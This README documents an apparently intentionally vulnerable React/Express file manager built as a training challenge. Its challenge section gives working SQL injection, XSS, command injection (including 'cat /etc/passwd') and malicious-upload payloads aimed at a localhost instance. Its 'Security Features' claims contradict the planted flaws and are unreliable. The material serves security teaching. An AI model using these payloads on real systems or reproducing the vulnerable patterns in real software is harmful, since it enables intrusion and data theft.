# File Manager - Fullstack React Application

A simple but fully functional fullstack web application built with React frontend and Node.js/Express backend, featuring user authentication, file upload, search, and profile management.

## Features

- **🔐 User Authentication**: Secure login and registration system with JWT tokens
- **📁 File Upload**: Drag & drop file upload with support for multiple files
- **🔍 File Search**: Search through uploaded files by filename
- **👤 User Profile**: View account information and manage profile
- **📊 Dashboard**: Overview of recent files and quick access to features
- **💾 File Management**: Download, delete, and organize files
- **📱 Responsive Design**: Modern UI that works on all devices

## Tech Stack

### Backend
- **Node.js** - Runtime environment
- **Express.js** - Web framework
- **SQLite3** - Database
- **JWT** - Authentication
- **bcryptjs** - Password hashing
- **Multer** - File upload handling
- **CORS** - Cross-origin resource sharing

### Frontend
- **React 18** - UI library
- **React Router** - Client-side routing
- **Axios** - HTTP client
- **CSS3** - Styling with modern design

## Project Structure

```
vuln-docker-app/
├── server/
│   └── index.js          # Express server with all API endpoints
├── client/
│   ├── public/
│   │   └── index.html    # Main HTML file
│   ├── src/
│   │   ├── components/   # React components
│   │   │   ├── Navbar.js
│   │   │   ├── Login.js
│   │   │   ├── Register.js
│   │   │   ├── Dashboard.js
│   │   │   ├── Upload.js
│   │   │   ├── Search.js
│   │   │   └── Profile.js
│   │   ├── App.js        # Main React app
│   │   ├── index.js      # React entry point
│   │   └── index.css     # Global styles
│   └── package.json      # React dependencies
├── package.json          # Server dependencies
└── README.md
```

## Quick Start

### Prerequisites
- Node.js (v14 or higher)
- npm or yarn

### Installation

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd vuln-docker-app
   ```

2. **Install all dependencies**
   ```bash
   npm run install-all
   ```

3. **Start the development servers**
   ```bash
   npm run dev
   ```

This will start both the backend server (port 5000) and React development server (port 3000).

### Manual Setup (Alternative)

If you prefer to set up manually:

1. **Install server dependencies**
   ```bash
   npm install
   ```

2. **Install client dependencies**
   ```bash
   cd client
   npm install
   cd ..
   ```

3. **Start the backend server**
   ```bash
   npm run server
   ```

4. **In a new terminal, start the React app**
   ```bash
   npm run client
   ```

## Usage

### First Time Setup

1. Open your browser and navigate to `http://localhost:3000`
2. Click "Register here" to create a new account
3. Fill in your username, email, and password
4. You'll be automatically logged in and redirected to the dashboard

### Features Guide

#### Dashboard
- View recent files
- Quick access to all features
- File count and overview

#### Upload Files
- Drag and drop files into the upload area
- Click "Choose Files" to select files manually
- Support for multiple file uploads
- 10MB file size limit per file

#### Search Files
- Search by filename or original name
- Real-time search results
- View all files when no search query is entered

#### Profile
- View account information
- See member since date
- Account security information

#### File Management
- Download files
- Delete files (with confirmation)
- View file metadata (size, upload date)

## API Endpoints

### Authentication
- `POST /api/register` - User registration
- `POST /api/login` - User login

### Files
- `GET /api/files` - Get user's files
- `POST /api/upload` - Upload file
- `GET /api/download/:filename` - Download file
- `DELETE /api/files/:id` - Delete file

### Search
- `GET /api/search?query=<search_term>` - Search files

### Profile
- `GET /api/profile` - Get user profile

## Security Features

- **Password Hashing**: All passwords are hashed using bcrypt
- **JWT Authentication**: Secure token-based authentication
- **File Isolation**: Users can only access their own files
- **Input Validation**: Server-side validation for all inputs
- **CORS Protection**: Configured for secure cross-origin requests

## ⚠️ Security Challenge: Multiple Vulnerabilities

This application contains **intentional security vulnerabilities** for educational purposes. There are four hidden flags that can be accessed through different attack vectors:

1. **SQL Injection Vulnerability** - Flag: `ninja{sql_injection_sucessful_}`
2. **Cross-Site Scripting (XSS) Vulnerability** - Flag: `ninja{xss_vulnerability_exploited_}`
3. **Command Injection Vulnerability** - Flag: `ninja{command_injection_successful_}`
4. **File Upload Vulnerability** - Flag: `ninja{file_upload_vulnerability_exploited_}`

### How to Find the Flags

#### 1. SQL Injection Vulnerability

**Location**: Search functionality (`/search` page)

**What Makes It Vulnerable**:
The search endpoint uses direct string concatenation instead of parameterized queries, making it vulnerable to SQL injection.

**Steps to Exploit**:
1. **Start the application** and create a user account
2. **Login** to the application
3. **Navigate to the Search page** (`/search`)
4. **Use SQL injection payloads** in the search field:

**Basic Union-based injection**:
```
' UNION SELECT 1,2,3,4,5 FROM secret_flags --
```

**Extract the flag**:
```
' UNION SELECT 1,flag_name,flag_value,description,5 FROM secret_flags --
```

**Alternative payloads**:
```
' UNION SELECT 1,2,3,4,5 FROM sqlite_master WHERE type='table' --
' UNION SELECT 1,'FLAG',flag_value,'DESCRIPTION',5 FROM secret_flags WHERE flag_name='sql_injection' --
```

**Expected Result**: The flag `ninja{sql_injection_sucessful_}` will appear in the search results.

#### 2. Cross-Site Scripting (XSS) Vulnerability

**Location**: Search functionality (`/search` page)

**What Makes It Vulnerable**:
The search query is rendered directly in the DOM using `dangerouslySetInnerHTML` without sanitization, allowing XSS attacks.

**Steps to Exploit**:
1. **Login** to the application
2. **Navigate to the Search page** (`/search`)
3. **Use XSS payloads** in the search field:

**Basic XSS to extract flag**:
```html
<script>alert(document.getElementById('xss-flag').getAttribute('data-flag'))</script>
```

**Alternative XSS payloads**:
```html
<img src=x onerror='alert(document.getElementById("xss-flag").getAttribute("data-flag"))'>
<svg onload='alert(document.getElementById("xss-flag").getAttribute("data-flag"))'>
<script>console.log('XSS Flag:', document.getElementById('xss-flag').getAttribute('data-flag'))</script>
```

**Expected Result**: 
- An alert will pop up showing the flag `ninja{xss_vulnerability_exploited_}`
- Or check the browser console for the flag
- The flag is stored in a hidden div with ID `xss-flag`

#### 3. Command Injection Vulnerability

**Location**: System Info endpoint (`/api/system-info`)

**What Makes It Vulnerable**:
The endpoint directly executes user input as system commands without sanitization, allowing command injection attacks.

**Steps to Exploit**:
1. **Login** to the application
2. **Navigate to the Search page** (contains the command injection testing interface)
3. **Use the Command Injection Testing section** or make direct API calls

**Basic system commands**:
```
whoami
pwd
ls -la
cat /etc/passwd
uname -a
```

**Extract the flag from database**:
```
sqlite3 users.db 'SELECT flag_value FROM command_injection_flags WHERE flag_name="command_injection"'
```

**Chain commands**:
```
whoami && pwd && ls
```

**Direct API call** (using curl or Postman):
```bash
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "http://localhost:5000/api/system-info?command=whoami"
```

**Expected Result**: The command output will show system information, and the flag `ninja{command_injection_successful_}` can be extracted.

#### 4. File Upload Vulnerability

**Location**: File upload functionality and processing endpoint

**What Makes It Vulnerable**:
- No file type validation - allows any file type including executables
- Direct file execution through `/api/process-file/:filename` endpoint
- No content validation or sanitization

**Steps to Exploit**:
1. **Login** to the application
2. **Navigate to the Upload page** (`/upload`)
3. **Create a malicious file** with the following content:

**Create a shell script** (`malicious.sh`):
```bash
#!/bin/bash
echo "ninja{file_upload_vulnerability_exploited_}"
echo "Command injection successful!"
whoami
pwd
ls -la
```

4. **Upload the malicious file** through the web interface
5. **Execute the uploaded file** using the vulnerable endpoint:

**Direct API call**:
```bash
curl -H "Authorization: Bearer YOUR_TOKEN" \
     "http://localhost:5000/api/process-file/FILENAME"
```

**Expected Result**: The malicious file will execute and output the flag `ninja{file_upload_vulnerability_exploited_}` along with system information.

### Automated Testing

A comprehensive test script `test_sql_injection.js` is included to automatically test all vulnerabilities:

```bash
# Install required dependencies
npm install axios form-data

# Update username/password in the script
# Run the test script
node test_sql_injection.js
```

The script will:
- Test SQL injection with various payloads
- Provide XSS payloads for manual testing
- Test command injection with system commands
- Create and upload a malicious file to test file upload vulnerability

### What Happens

Each vulnerability demonstrates different attack vectors:

- **SQL Injection**: Direct string concatenation in database queries
- **XSS**: Unsanitized user input rendered in DOM
- **Command Injection**: Direct command execution without input validation
- **File Upload**: No file type restrictions and direct file execution

### Learning Objectives

- Understand how different types of vulnerabilities occur
- Learn to identify vulnerable code patterns
- Practice various exploitation techniques in a safe environment
- Recognize the importance of proper input validation and sanitization
- Understand the impact of combining multiple vulnerabilities

**Note**: These vulnerabilities are intentionally placed for educational purposes. In real applications, always implement proper security measures to prevent these attacks.

## File Storage

- Files are stored in the `uploads/` directory
- Each file gets a unique filename to prevent conflicts
- Original filenames are preserved in the database
- File size limits are enforced (10MB per file)

## Database

- SQLite3 database (`users.db`) is automatically created
- Tables for users and files are created on first run
- No additional database setup required

## Production Deployment

### Environment Variables
- Set `PORT` for custom server port
- Change `JWT_SECRET` in `server/index.js` for production

### Build for Production
```bash
npm run build
```

### Start Production Server
```bash
npm start
```

## Troubleshooting

### Common Issues

1. **Port already in use**
   - Change the port in `server/index.js` or kill the process using the port

2. **Database errors**
   - Delete `users.db` file and restart the server

3. **File upload fails**
   - Check that the `uploads/` directory exists and has write permissions

4. **CORS errors**
   - Ensure the backend is running on port 5000 and frontend on port 3000

### Logs
- Backend logs are displayed in the terminal running the server
- Frontend errors are shown in the browser console

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## License

This project is licensed under the MIT License.

## Support

For issues and questions:
1. Check the troubleshooting section
2. Review the code for common mistakes
3. Create an issue in the repository

---

**Note**: This is a simple but fully functional application. For production use, consider adding:
- Rate limiting
- Input sanitization
- Logging
- Error monitoring
- HTTPS enforcement
- Database backups
- File compression
- CDN integration